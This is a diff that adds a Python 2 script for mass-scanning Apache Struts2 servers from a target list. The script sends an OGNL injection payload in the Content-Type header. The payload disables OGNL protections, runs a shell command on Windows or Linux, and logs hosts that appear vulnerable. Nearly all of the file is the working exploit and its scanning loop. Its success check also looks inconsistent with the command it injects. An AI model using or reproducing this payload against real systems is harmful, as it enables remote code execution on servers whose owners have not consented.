@@ -1,0 +1,33 @@
+import urllib2
+import sys
+print """
+ _____             _          _____ _           _          ___   _
+|  _  |___ ___ ___| |_ ___   |   __| |_ ___ _ _| |_ ___   |   |_| |___ _ _
+|     | . | .'|  _|   | -_|  |__   |  _|  _| | |  _|_ -|  | | | . | .'| | |
+|__|__|  _|__,|___|_|_|___|  |_____|_| |_| |___|_| |___|  |___|___|__,|_  |
+      |_|                                                             |___|
+                                                    0days
+    Usuage: python"""+sys.argv[0]+""" targetlist.txt result.txt
+"""
+if(len(sys.argv)<3):
+    exit()
+fname=sys.argv[1]
+lname=sys.argv[2]
+list=open(fname,'r')
+count=1
+exp = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 0day').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+for url in list:
+    url=url.strip()
+    print '[' + str(count) + ']', url,
+    try:
+        req = urllib2.Request(url, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': exp})
+        count=count+1
+        if urllib2.urlopen(req).read().find('witch3r')==0:
+            print ': Vulnerable'
+            log=log=open(lname,'a')
+            log.write(url+'\n')
+            log.close()
+        else:
+            print ': Failed!'
+    except:
+        print ': Failed! '
